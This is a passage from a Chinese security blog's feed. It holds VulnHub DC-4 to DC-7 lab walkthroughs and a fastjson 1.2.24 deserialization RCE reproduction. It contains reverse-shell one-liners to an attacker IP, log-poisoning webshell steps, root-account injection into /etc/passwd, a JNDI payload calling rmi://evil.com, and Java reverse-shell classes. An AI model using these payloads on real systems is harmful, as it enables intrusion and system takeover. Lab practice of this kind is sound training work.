like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>nc监听反弹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152133693.png"></p><p>反弹一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>将反弹shell的命令写入最开始的backups.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152148432.png"></p><p>等计划任务执行反弹一个shell回来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152148588.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-7,356/&quot;&gt;https://www.vulnhub.com/entry/dc-7,356/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.148&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="Drupal" scheme="https://syst1m.top/tags/Drupal/"/>
    
  </entry>
  
  <entry>
    <title>vlunhub-dc6打靶</title>
    <link href="https://syst1m.top/2022/06/15/vulnhub-dc6%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/15/vulnhub-dc6%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-15T05:40:43.000Z</published>
    <updated>2022-06-15T11:42:33.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>靶机:172.16.17.147<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫一下靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151342099.png"></p><p>访问发现被重定向<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151340350.png"></p><p>添加一个dns解析,WordPress<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151355811.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="爆破账号"><a href="#爆破账号" class="headerlink" title="爆破账号"></a>爆破账号</h2><p>使用wpscan暴力扫出账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151425104.png"><br>根据给出的线索拿到密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151432351.png"></p><p>要注意的是这个文件是一个压缩包,需要先解压<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151437401.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151438388.png"></p><p>根据账号密码去爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151439811.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151445374.png"><br>爆破出账号密码<br>mark &#x2F; helpdesk0</p><h2 id="插件利用"><a href="#插件利用" class="headerlink" title="插件利用"></a>插件利用</h2><p>后台发现一个插件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151453588.png"></p><p>找到利用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151454374.png"></p><p>修改利用文件反弹地址为kali的地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151704922.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>kali监听,然后打开利用文件,反弹一个shell回来,再用python起一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151706659.png"></p><p>翻目录找到可以利用的点,一个可以登录的账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151724387.png"></p><p>登录上去后,查看sudo运行的命令,找到一个脚本<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151731225.png"></p><p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151836816.png"></p><p>继续看suid命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151839915.png"></p><p>存在nmap,可以使用nmap来提权<br>nse是nmap的插件扩展名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> os.execute(<span class="string">&#x27;/bin/bash&#x27;</span>) &gt; shell.nes</span><br><span class="line">sudo nmap --script=shell.nes</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151846689.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151846069.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-6,315/&quot;&gt;https://www.vulnhub.com/entry/dc-6,315/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.147&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="WordPress" scheme="https://syst1m.top/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc5打靶</title>
    <link href="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-14T11:21:37.000Z</published>
    <updated>2022-06-14T14:37:14.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>vulnhub <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>靶机:172.16.17.146<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141959729.png"></p><p>开了111端口rpcbind,百度是拒绝服务漏洞,忽略</p><p>打开网站首页,扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002735.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002568.png"></p><p>发现一个留言板,提交看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142008726.png"><br>多次提交后发现,页脚在变化,结合扫目录时候发现一个footer.php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142009106.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142010169.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>应该是包含了这个footer.php文件,尝试文件包含漏洞,猜一下参数名<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142013650.png"></p><p>尝试伪协议getshell,但是应该没有开启allow_url_include,默认为关闭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1?file=php://input PostData:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="尝试读取别的信息"><a href="#尝试读取别的信息" class="headerlink" title="尝试读取别的信息"></a>尝试读取别的信息</h2><p>权限很低,只能读取一下nginx的日志,因为扫过目录所以信息很多,翻到最后可以看到我们读取&#x2F;etc&#x2F;passwd的请求<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142025366.png"></p><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>总结一下,现在我们有文件包含,能查看nginx日志<br>那么我是否可以构造一句话请求,让他写入日志,再利用文件包含去执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142210938.png"></p><p>这里有一个坑,请求发送之后,再去查看日志,却没有,其实已经写进去了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142212468.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>反弹一个shell到kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142214174.png"></p><p>这里反弹回来的就是一个交互式shell</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>翻了翻目录,没什么东西,看看以root权限运行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142217377.png"></p><p>有一个screen<br>Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p><p>kali搜索一下利用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142235068.png"></p><p>将exp复制出来用蚁剑直接写到tmp目录下<br>在root目录下拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142236665.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;vulnhub &lt;a href=&quot;https://www.vulnhub.com/entry/dc-5,314/&quot;&gt;https://www.vulnhub.com/entry/dc-5,314/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.146&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="文件包含" scheme="https://syst1m.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>vlunhub-dc4打靶</title>
    <link href="https://syst1m.top/2022/06/13/vulnhub-dc4%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/13/vulnhub-dc4%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-13T11:36:38.000Z</published>
    <updated>2022-06-13T12:47:00.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a><br>靶机:172.16.17.145<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131949872.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行nmap扫描<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131938943.png"><br>开放22和80端口</p><p>打开网站首页是一个登录框<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131942760.png"></p><p>扫描目录,没什么收获<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131938888.png"></p><p>回到登录,没有验证码也没有token,尝试爆破<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131937353.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131937509.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>登录看到,command敏感字,继续跟进<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131944821.png"></p><p>明显的命令执行,抓包分析<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131945003.png"></p><p>成功执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131947263.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>反弹一个shell到kali看看 ,nc监听本地4444端口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131949018.png"></p><p>反弹成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 172.16.17.140 4444</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131959946.png"></p><p>利用python反弹一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132003636.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>翻翻目录,在家目录翻到一些文件,发现疑似密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132013881.png"></p><p>复制出来构造账号为家目录的几个文件夹名,密码为passwords.bak文件里的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132019075.png"></p><p>用hydra爆破出账号密码  jim&#x2F;jibril04<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132030300.png"></p><p>登录,一顿翻发现有邮件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132034541.png"></p><p>在&#x2F;var&#x2F;spool&#x2F;mail下翻到邮件,找到Charles的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132035868.png"></p><p>尝试登录,发现没有这个用户<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132036751.png"><br>切换一下小写成功登录,查看一下sudo 运行的命令有一个teehee<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132043031.png"></p><p>使用teehee命令提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nginx/html$ <span class="built_in">echo</span> <span class="string">&quot;ceshi::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>提权到 root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132046393.png"></p><p>找到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132046070.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-4,313/&quot;&gt;https://www.vulnhub.com/entry/dc-4,313/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.145&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206131949872.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="drupal7" scheme="https://syst1m.top/tags/drupal7/"/>
    
    <category term="提权" scheme="https://syst1m.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>fastjson1.2.24反序列化漏洞复现</title>
    <link href="https://syst1m.top/2022/06/13/fastjson1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/13/fastjson1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-13T07:42:41.000Z</published>
    <updated>2022-06-13T11:55:33.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>CVE-2017-18349<br>fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。<br>根据官方给出的补丁文件，主要的更新在这个 checkAutoType 函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>vulhub项目 <a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131547498.png"></p><p>向服务器post一个json对象,即可更新服务端信息<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131555028.png"></p><p>因为目标环境是 Java 8u102，没有 com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl的利用链，借助 JNDI 注入来执行命令。<br>首先编译并上传命令执行代码，如 <a href="http://x.x.x.x:8989/TouchFile.class%EF%BC%9A">http://x.x.x.x:8989/TouchFile.class：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131559623.png"></p><p>需要注意的是:<br>String commands 在部分环境下需要添加 bash -c ,否则无法执行命令。<br>如果没有 web 服务，其实可以通过 php -S 0.0.0.0: port或者 python -m SimpleHTTPServer port临时搭建一个 web 服务器，其发布目录即当前执行目录。</p><h2 id="有外网VPS"><a href="#有外网VPS" class="headerlink" title="有外网VPS"></a>有外网VPS</h2><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec项目</a>启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类 TouchFile.class<br>也可以使用打包好的jar包<a href="https://github.com/zhzyker/exphub/blob/master/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar">项目地址</a></p><p>将生成的 marshalsec-0.0.3-SNAPSHOT-all.jar包部署到公网的一台 VPS 上，执行如下脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://x.x.x.x:port/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p>发送如下数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8090</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>160</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://evil.com:9999/TouchFile&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span></span><br><span class="line"><span class="language-json">    <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="无外网VPS"><a href="#无外网VPS" class="headerlink" title="无外网VPS"></a>无外网VPS</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>使用kali当vps主机</p><p>先构造恶意代码,并编译<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131846179.png"></p><p>再使用python起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131847211.png"></p><p>接着启动一个RMI服务器，设置监听端口，并制定加载远程类TouchFile.class,ip为http服务的ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://172.16.17.140:80/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131848263.png"></p><p>构造数据包,写入exp<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131849458.png"></p><p>命令执行成功<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131850067.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell,只需要修改TouchFile.java文件中的command 部分即可,并重新编译,参考如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac shell_re.java</span></span><br><span class="line"> <span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"> <span class="keyword">import</span> java.lang.Process;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_re</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) 